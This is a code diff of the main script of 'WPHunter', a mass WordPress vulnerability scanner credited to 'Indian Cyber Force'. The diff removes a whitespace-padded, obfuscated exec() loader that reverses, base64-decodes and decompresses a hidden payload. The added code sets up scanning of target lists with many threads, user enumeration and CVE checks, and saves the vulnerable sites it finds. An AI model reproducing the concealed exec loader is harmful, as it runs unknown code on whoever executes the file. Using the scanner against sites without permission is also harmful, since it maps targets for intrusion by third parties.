@@ -1,2 +1,178 @@
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+import argparse
+import asyncio
+import os
+import sys
+from colorama import init, Fore, Style
+from rich.panel import Panel
+from rich.text import Text
+from rich.console import Console
+
+from wphunter.scanner.core import WPScanner
+from wphunter.utils.logger import Logger
+from wphunter.utils.fileio import FileIO
+from wphunter.utils.versiondetect import VersionManager
+
+from wphunter.__version__ import __version__
+
+
+class Config:
+
+    def __init__(self, args):
+        self.url = args.url
+        self.targets_file = args.targets
+        self.threads = args.threads
+        self.silent = args.silent
+        self.verbose = args.verbose
+        self.enumerate_users = args.users
+        self.output_file = args.output
+        self.timeout = args.timeout
+        self.retries = args.retries
+        self.specific_plugin_slug = args.plugin
+        self.specific_cve_id = args.cve
+        self.save_by_plugin = args.save_by_plugin
+
+async def main():
+
+    init(autoreset=True)
+    console = Console()
+
+    banner_text = Text("Mass WordPress Vulnerability Scanner bY Indian Cyber Force", style="bold cyan")
+    banner_panel = Panel(
+        banner_text,
+        title=f"[bold red]WPHunter v{__version__}[/bold red]",
+        title_align="center",
+        border_style="bold red",
+        padding=(1, 2)
+    )
+    console.print(banner_panel)
+
+    parser = argparse.ArgumentParser(
+        description=f"{Fore.CYAN}A Mass WordPress Vulnerability Scanner.{Style.RESET_ALL}",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument(
+        "--url",
+        help="Scan a single target site (https://target.pk)"
+    )
+    group.add_argument(
+        "--targets",
+        help="Contain Targets in file for Mass scan"
+    )
+    parser.add_argument(
+        "--threads",
+        type=int,
+        default=50,
+        help="Number of threads for faster scanning."
+    )
+    parser.add_argument(
+        "--silent",
+        action="store_true",
+        help="No output show on terminal"
+    )
+    parser.add_argument(
+        "--verbose",
+        action="store_true",
+        help="Enable detailed logging."
+    )
+    parser.add_argument(
+        "--users",
+        action="store_true",
+        help="Enumerate WordPress users."
+    )
+    parser.add_argument(
+        "--output",
+        help="File path to save the scan report. \n\n"
+                "The output format:\n"
+                " - .txt: Saves only vulnerable sites.\n"
+                " - .csv: Saves vulnerable sites with details.\n"
+                " - .json: Saves full scan data for sites.\n"
+    )
+    parser.add_argument(
+        "--timeout",
+        type=int,
+        default=5,
+        help="http request timeout in seconds"
+    )
+    parser.add_argument(
+        "--retries",
+        type=int,
+        default=2,
+        help="number of retries for failed http requests."
+    )
+    parser.add_argument(
+        "--update",
+        action="store_true",
+        help="Check provided instructions to update wphunter"
+    )
+    parser.add_argument(
+        "--plugin",
+        help="Scan For a specific Plugin."
+    )
+    parser.add_argument(
+        "--cve",
+        help="scan for a specific cve-id."
+    )
+    parser.add_argument(
+        "--save-by-plugin",
+        action="store_true",
+        help="save separate text File For each vulnerable plugin found."
+    )
+    args = parser.parse_args()
+    logger = Logger(verbose=args.verbose, silent=args.silent)
+
+    # check version
+    if await VersionManager.update_checker(logger=logger):
+        VersionManager.updatewarn(logger)
+        sys.exit(0)
+    
+    if args.update:
+        sys.exit(0)
+
+    config = Config(args)
+
+    targets = []
+    if config.url:
+        targets.append(config.url)
+    elif config.targets_file:
+        try:
+            targets = FileIO.readinput(config.targets_file)
+            if not targets:
+                logger.log(f"No target url found in '{config.targets_file}'.check the file.", level='error')
+                sys.exit(1)
+        except FileNotFoundError:
+            logger.log(f"Error: target file '{config.targets_file}' was not found.", level='error')
+            sys.exit(1)
+        except IOError as e:
+            logger.log(f"Error reading target file '{config.targets_file}': {e}", level='error')
+            sys.exit(1)
+
+    scanner = WPScanner(config, logger)
+    full_results = await scanner.start_scan(targets)
+
+    logger.trees(full_results)
+
+    if config.output_file:
+        file_extension = os.path.splitext(config.output_file)[1].lower()
+        
+        vulnerable_report_data = {
+            target_url: result for target_url, result in full_results.items()
+            if result.get('vulnerable_plugins')
+        }
+        
+        if file_extension == '.txt':
+            if vulnerable_report_data:
+                logger.vulnxsites(config.output_file, vulnerable_report_data)
+        elif file_extension == '.csv':
+            if vulnerable_report_data:
+                logger.csvform(config.output_file, full_results)
+        elif file_extension == '.json':
+            logger.jsonform(config.output_file, full_results)
+        else:
+            logger.log(f"Unsupported output file extension '{file_extension}'. Please use .txt, .csv, or .json.", level='error')
+
+    if config.save_by_plugin:
+        logger.savebypluginname()
+        
+if __name__ == "__main__":
+    asyncio.run(main())
